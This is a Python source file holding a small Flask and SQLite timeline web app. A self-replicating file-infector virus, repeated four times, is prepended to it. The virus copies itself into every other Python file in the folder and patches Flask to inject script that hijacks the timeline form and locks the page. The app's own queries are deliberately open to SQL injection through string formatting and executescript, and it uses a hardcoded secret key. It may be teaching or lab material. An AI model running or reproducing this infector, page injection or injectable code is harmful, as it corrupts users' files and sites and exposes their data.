import sys
import glob
import time

virus_code = []

with open(sys.argv[0], "r") as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "#Boo you have been hacked":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == '# Im leaving, Bye!\n':
        break

python_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in python_files:
    if file == sys.argv[0]:
        continue
        
    with open(file, "r") as f:
        file_code = f.readlines()
    
    infected = False
    for line in file_code:
        if line == '#Boo you have been hacked\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, "w") as f:
            f.writelines(final_code)

def malicious_code():
    print("You have been hacked, hahahaha!!")

    try:
        import flask
        original_flask = flask.Flask

        class MaliciousFlask(original_flask):
            def route(self, rule, **options):
                original_decorator = super().route(rule, **options)
                def malicious_decorator(f):
                    if f.__name__ == 'index':
                        def wrapper(*args, **kwargs):
                            result = f(*args, **kwargs)
                            if isinstance(result, str):
                                inject_script = '''<script>
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        if (forms[i].action.indexOf('create_time_line') !== -1) {
            forms[i].addEventListener('submit', function(e) {
                e.preventDefault();
                alert('YOU HAVE BEEN HACKED!');
                setTimeout(function() {
                    var barrier = document.createElement('div');
                    barrier.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;cursor:not-allowed;pointer-events:all;';
                    document.body.appendChild(barrier);
                }, 5000);
            });
        }
    }
});
</script>'''
                                return result + inject_script
                            return result
                        wrapper.__name__ = f.__name__
                        return original_decorator(wrapper)
                    return original_decorator(f)
                return malicious_decorator

        flask.Flask = MaliciousFlask
    except Exception:
        pass

malicious_code()


# -*- coding: utf-8 -*-
import os
import sqlite3

from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)

app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(32),
            password VARCHAR(32)
            )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    #username=username.replace("'","")  #SQL injection countermeasure
    #username=username.replace('-','')  #SQL injection countermeasure
    print(username)
    cur.execute('SELECT id, username FROM `user` WHERE username=:username AND password=:password', {'username': username, 'password': password})
    row = cur.fetchone()
    conn.commit()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None

def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM `user` WHERE id=%d' % uid)
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return {'id': row[0], 'username': row[1]}


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    cur.executescript('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))   
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return row


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM `time_line` ORDER BY id DESC')
    rows = cur.fetchall()
    conn.commit()
    conn.close()

    return map(lambda row: {'id': row[0], 'user_id': row[1], 'content': row[2]}, rows)


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM `time_line` WHERE  user_id=%s AND id=%s' % (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<form method="POST" style="margin: 60px auto; width: 140px;">
    <p><input name="username" type="text" /></p>
    <p><input name="password" type="password" /></p>
    <p><input value="Login" type="submit" /></p>
</form>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<div style="width: 400px; margin: 80px auto; ">
    <h4>I am: {{ user['username'] }}</h4>
    <form method="POST" action="/create_time_line">
        Add time line:
        <input type="text" name="content" />
        <input type="submit" value="Submit" />
    </form>
    <ul style="border-top: 1px solid #ccc;">
        {% for line in time_lines %}
        <li style="border-top: 1px solid #efefef;">
            <p>{{ line['content'] }}</p>
            {% if line['user_id'] == user['id'] %}
            <a href="/delete/time_line/{{ line['id'] }}">Delete</a>
            {% endif %}
        </li>
        {% endfor %}
    </ul>
</div>
    ''')
    return template.render(user=user, time_lines=time_lines)

@app.route('/init')
def init_page():
    init()
    return redirect('/')
@app.route('/')
def index():
    if 'uid' in session:
        return render_home_page(session['uid'])
    return redirect('/login')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_from_username_and_password(username, password)
        if user is not None:
            session['uid'] = user['id']
            return redirect('/')
        else:
            return redirect('/login')


@app.route('/create_time_line', methods=['POST'])
def time_line():
    if 'uid' in session:
        uid = session['uid']
        create_time_line(uid, request.form['content'])
    return redirect('/')


@app.route('/delete/time_line/<tid>')
def delete_time_line(tid):
    if 'uid' in session:
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    if 'uid' in session:
        session.pop('uid')
    return redirect('/login')


if __name__ == '__main__':
    app.run(debug=True)
import sys
import glob
import time

virus_code = []

with open(sys.argv[0], "r") as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "#Boo you have been hacked":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == '# Im leaving, Bye!\n':
        break

python_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in python_files:
    if file == sys.argv[0]:
        continue
        
    with open(file, "r") as f:
        file_code = f.readlines()
    
    infected = False
    for line in file_code:
        if line == '#Boo you have been hacked\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, "w") as f:
            f.writelines(final_code)

def malicious_code():
    print("You have been hacked, hahahaha!!")

    try:
        import flask
        original_flask = flask.Flask

        class MaliciousFlask(original_flask):
            def route(self, rule, **options):
                original_decorator = super().route(rule, **options)
                def malicious_decorator(f):
                    if f.__name__ == 'index':
                        def wrapper(*args, **kwargs):
                            result = f(*args, **kwargs)
                            if isinstance(result, str):
                                inject_script = '''<script>
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        if (forms[i].action.indexOf('create_time_line') !== -1) {
            forms[i].addEventListener('submit', function(e) {
                e.preventDefault();
                alert('YOU HAVE BEEN HACKED!');
                setTimeout(function() {
                    var barrier = document.createElement('div');
                    barrier.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;cursor:not-allowed;pointer-events:all;';
                    document.body.appendChild(barrier);
                }, 5000);
            });
        }
    }
});
</script>'''
                                return result + inject_script
                            return result
                        wrapper.__name__ = f.__name__
                        return original_decorator(wrapper)
                    return original_decorator(f)
                return malicious_decorator

        flask.Flask = MaliciousFlask
    except Exception:
        pass

malicious_code()


# -*- coding: utf-8 -*-
import os
import sqlite3

from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)

app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(32),
            password VARCHAR(32)
            )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    #username=username.replace("'","")  #SQL injection countermeasure
    #username=username.replace('-','')  #SQL injection countermeasure
    print(username)
    cur.execute('SELECT id, username FROM `user` WHERE username=:username AND password=:password', {'username': username, 'password': password})
    row = cur.fetchone()
    conn.commit()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None

def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM `user` WHERE id=%d' % uid)
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return {'id': row[0], 'username': row[1]}


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    cur.executescript('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))   
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return row


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM `time_line` ORDER BY id DESC')
    rows = cur.fetchall()
    conn.commit()
    conn.close()

    return map(lambda row: {'id': row[0], 'user_id': row[1], 'content': row[2]}, rows)


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM `time_line` WHERE  user_id=%s AND id=%s' % (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<form method="POST" style="margin: 60px auto; width: 140px;">
    <p><input name="username" type="text" /></p>
    <p><input name="password" type="password" /></p>
    <p><input value="Login" type="submit" /></p>
</form>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<div style="width: 400px; margin: 80px auto; ">
    <h4>I am: {{ user['username'] }}</h4>
    <form method="POST" action="/create_time_line">
        Add time line:
        <input type="text" name="content" />
        <input type="submit" value="Submit" />
    </form>
    <ul style="border-top: 1px solid #ccc;">
        {% for line in time_lines %}
        <li style="border-top: 1px solid #efefef;">
            <p>{{ line['content'] }}</p>
            {% if line['user_id'] == user['id'] %}
            <a href="/delete/time_line/{{ line['id'] }}">Delete</a>
            {% endif %}
        </li>
        {% endfor %}
    </ul>
</div>
    ''')
    return template.render(user=user, time_lines=time_lines)

@app.route('/init')
def init_page():
    init()
    return redirect('/')
@app.route('/')
def index():
    if 'uid' in session:
        return render_home_page(session['uid'])
    return redirect('/login')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_from_username_and_password(username, password)
        if user is not None:
            session['uid'] = user['id']
            return redirect('/')
        else:
            return redirect('/login')


@app.route('/create_time_line', methods=['POST'])
def time_line():
    if 'uid' in session:
        uid = session['uid']
        create_time_line(uid, request.form['content'])
    return redirect('/')


@app.route('/delete/time_line/<tid>')
def delete_time_line(tid):
    if 'uid' in session:
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    if 'uid' in session:
        session.pop('uid')
    return redirect('/login')


if __name__ == '__main__':
    app.run(debug=True)
import sys
import glob
import time

virus_code = []

with open(sys.argv[0], "r") as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "#Boo you have been hacked":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == '# Im leaving, Bye!\n':
        break

python_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in python_files:
    if file == sys.argv[0]:
        continue
        
    with open(file, "r") as f:
        file_code = f.readlines()
    
    infected = False
    for line in file_code:
        if line == '#Boo you have been hacked\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, "w") as f:
            f.writelines(final_code)

def malicious_code():
    print("You have been hacked, hahahaha!!")

    try:
        import flask
        original_flask = flask.Flask

        class MaliciousFlask(original_flask):
            def route(self, rule, **options):
                original_decorator = super().route(rule, **options)
                def malicious_decorator(f):
                    if f.__name__ == 'index':
                        def wrapper(*args, **kwargs):
                            result = f(*args, **kwargs)
                            if isinstance(result, str):
                                inject_script = '''<script>
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        if (forms[i].action.indexOf('create_time_line') !== -1) {
            forms[i].addEventListener('submit', function(e) {
                e.preventDefault();
                alert('YOU HAVE BEEN HACKED!');
                setTimeout(function() {
                    var barrier = document.createElement('div');
                    barrier.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;cursor:not-allowed;pointer-events:all;';
                    document.body.appendChild(barrier);
                }, 5000);
            });
        }
    }
});
</script>'''
                                return result + inject_script
                            return result
                        wrapper.__name__ = f.__name__
                        return original_decorator(wrapper)
                    return original_decorator(f)
                return malicious_decorator

        flask.Flask = MaliciousFlask
    except Exception:
        pass

malicious_code()


# -*- coding: utf-8 -*-
import os
import sqlite3

from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)

app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(32),
            password VARCHAR(32)
            )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    #username=username.replace("'","")  #SQL injection countermeasure
    #username=username.replace('-','')  #SQL injection countermeasure
    print(username)
    cur.execute('SELECT id, username FROM `user` WHERE username=:username AND password=:password', {'username': username, 'password': password})
    row = cur.fetchone()
    conn.commit()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None

def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM `user` WHERE id=%d' % uid)
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return {'id': row[0], 'username': row[1]}


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    cur.executescript('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))   
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return row


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM `time_line` ORDER BY id DESC')
    rows = cur.fetchall()
    conn.commit()
    conn.close()

    return map(lambda row: {'id': row[0], 'user_id': row[1], 'content': row[2]}, rows)


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM `time_line` WHERE  user_id=%s AND id=%s' % (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<form method="POST" style="margin: 60px auto; width: 140px;">
    <p><input name="username" type="text" /></p>
    <p><input name="password" type="password" /></p>
    <p><input value="Login" type="submit" /></p>
</form>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<div style="width: 400px; margin: 80px auto; ">
    <h4>I am: {{ user['username'] }}</h4>
    <form method="POST" action="/create_time_line">
        Add time line:
        <input type="text" name="content" />
        <input type="submit" value="Submit" />
    </form>
    <ul style="border-top: 1px solid #ccc;">
        {% for line in time_lines %}
        <li style="border-top: 1px solid #efefef;">
            <p>{{ line['content'] }}</p>
            {% if line['user_id'] == user['id'] %}
            <a href="/delete/time_line/{{ line['id'] }}">Delete</a>
            {% endif %}
        </li>
        {% endfor %}
    </ul>
</div>
    ''')
    return template.render(user=user, time_lines=time_lines)

@app.route('/init')
def init_page():
    init()
    return redirect('/')
@app.route('/')
def index():
    if 'uid' in session:
        return render_home_page(session['uid'])
    return redirect('/login')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_from_username_and_password(username, password)
        if user is not None:
            session['uid'] = user['id']
            return redirect('/')
        else:
            return redirect('/login')


@app.route('/create_time_line', methods=['POST'])
def time_line():
    if 'uid' in session:
        uid = session['uid']
        create_time_line(uid, request.form['content'])
    return redirect('/')


@app.route('/delete/time_line/<tid>')
def delete_time_line(tid):
    if 'uid' in session:
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    if 'uid' in session:
        session.pop('uid')
    return redirect('/login')


if __name__ == '__main__':
    app.run(debug=True)
import sys
import glob
import time

virus_code = []

with open(sys.argv[0], "r") as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "#Boo you have been hacked":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == '# Im leaving, Bye!\n':
        break

python_files = glob.glob("*.py") + glob.glob("*.pyw")

for file in python_files:
    if file == sys.argv[0]:
        continue
        
    with open(file, "r") as f:
        file_code = f.readlines()
    
    infected = False
    for line in file_code:
        if line == '#Boo you have been hacked\n':
            infected = True
            break
    
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, "w") as f:
            f.writelines(final_code)

def malicious_code():
    print("You have been hacked, hahahaha!!")

    try:
        import flask
        original_flask = flask.Flask

        class MaliciousFlask(original_flask):
            def route(self, rule, **options):
                original_decorator = super().route(rule, **options)
                def malicious_decorator(f):
                    if f.__name__ == 'index':
                        def wrapper(*args, **kwargs):
                            result = f(*args, **kwargs)
                            if isinstance(result, str):
                                inject_script = '''<script>
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
        if (forms[i].action.indexOf('create_time_line') !== -1) {
            forms[i].addEventListener('submit', function(e) {
                e.preventDefault();
                alert('YOU HAVE BEEN HACKED!');
                setTimeout(function() {
                    var barrier = document.createElement('div');
                    barrier.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:99999;cursor:not-allowed;pointer-events:all;';
                    document.body.appendChild(barrier);
                }, 5000);
            });
        }
    }
});
</script>'''
                                return result + inject_script
                            return result
                        wrapper.__name__ = f.__name__
                        return original_decorator(wrapper)
                    return original_decorator(f)
                return malicious_decorator

        flask.Flask = MaliciousFlask
    except Exception:
        pass

malicious_code()


# -*- coding: utf-8 -*-
import os
import sqlite3

from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)

app.secret_key = 'schrodinger cat'

DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')


def connect_db():
    return sqlite3.connect(DATABASE_PATH)


def create_tables():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username VARCHAR(32),
            password VARCHAR(32)
            )''')
    cur.execute('''
        CREATE TABLE IF NOT EXISTS time_line(
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        content TEXT,
        FOREIGN KEY (`user_id`) REFERENCES `user`(`id`)
        )''')
    conn.commit()
    conn.close()


def init_data():
    users = [
        ('user1', '123456'),
        ('user2', '123456')
    ]
    lines = [
        (1, 'Hello'),
        (1, 'World'),
        (2, 'Im 2'),
        (2, 'Hello 2')
    ]
    conn = connect_db()
    cur = conn.cursor()
    cur.executemany('INSERT INTO `user` VALUES(NULL,?,?)', users)
    cur.executemany('INSERT INTO `time_line` VALUES(NULL,?,?)', lines)
    conn.commit()
    conn.close()


def init():
    create_tables()
    init_data()


def get_user_from_username_and_password(username, password):
    conn = connect_db()
    cur = conn.cursor()
    #username=username.replace("'","")  #SQL injection countermeasure
    #username=username.replace('-','')  #SQL injection countermeasure
    print(username)
    cur.execute('SELECT id, username FROM `user` WHERE username=:username AND password=:password', {'username': username, 'password': password})
    row = cur.fetchone()
    conn.commit()
    conn.close()
    return {'id': row[0], 'username': row[1]} if row is not None else None

def get_user_from_id(uid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, username FROM `user` WHERE id=%d' % uid)
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return {'id': row[0], 'username': row[1]}


def create_time_line(uid, content):
    conn = connect_db()
    cur = conn.cursor()
    cur.executescript('INSERT INTO `time_line` VALUES (NULL, %d, \'%s\')' % (uid, content))   
    row = cur.fetchone()
    conn.commit()
    conn.close()

    return row


def get_time_lines():
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('SELECT id, user_id, content FROM `time_line` ORDER BY id DESC')
    rows = cur.fetchall()
    conn.commit()
    conn.close()

    return map(lambda row: {'id': row[0], 'user_id': row[1], 'content': row[2]}, rows)


def user_delete_time_line_of_id(uid, tid):
    conn = connect_db()
    cur = conn.cursor()
    cur.execute('DELETE FROM `time_line` WHERE  user_id=%s AND id=%s' % (uid, tid))
    conn.commit()
    conn.close()


def render_login_page():
    return '''
<form method="POST" style="margin: 60px auto; width: 140px;">
    <p><input name="username" type="text" /></p>
    <p><input name="password" type="password" /></p>
    <p><input value="Login" type="submit" /></p>
</form>
    '''


def render_home_page(uid):
    user = get_user_from_id(uid)
    time_lines = get_time_lines()
    template = Template('''
<div style="width: 400px; margin: 80px auto; ">
    <h4>I am: {{ user['username'] }}</h4>
    <form method="POST" action="/create_time_line">
        Add time line:
        <input type="text" name="content" />
        <input type="submit" value="Submit" />
    </form>
    <ul style="border-top: 1px solid #ccc;">
        {% for line in time_lines %}
        <li style="border-top: 1px solid #efefef;">
            <p>{{ line['content'] }}</p>
            {% if line['user_id'] == user['id'] %}
            <a href="/delete/time_line/{{ line['id'] }}">Delete</a>
            {% endif %}
        </li>
        {% endfor %}
    </ul>
</div>
    ''')
    return template.render(user=user, time_lines=time_lines)

@app.route('/init')
def init_page():
    init()
    return redirect('/')
@app.route('/')
def index():
    if 'uid' in session:
        return render_home_page(session['uid'])
    return redirect('/login')


@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_login_page()
    elif request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        user = get_user_from_username_and_password(username, password)
        if user is not None:
            session['uid'] = user['id']
            return redirect('/')
        else:
            return redirect('/login')


@app.route('/create_time_line', methods=['POST'])
def time_line():
    if 'uid' in session:
        uid = session['uid']
        create_time_line(uid, request.form['content'])
    return redirect('/')


@app.route('/delete/time_line/<tid>')
def delete_time_line(tid):
    if 'uid' in session:
        user_delete_time_line_of_id(session['uid'], tid)
    return redirect('/')


@app.route('/logout')
def logout():
    if 'uid' in session:
        session.pop('uid')
    return redirect('/login')


if __name__ == '__main__':
    app.run(debug=True)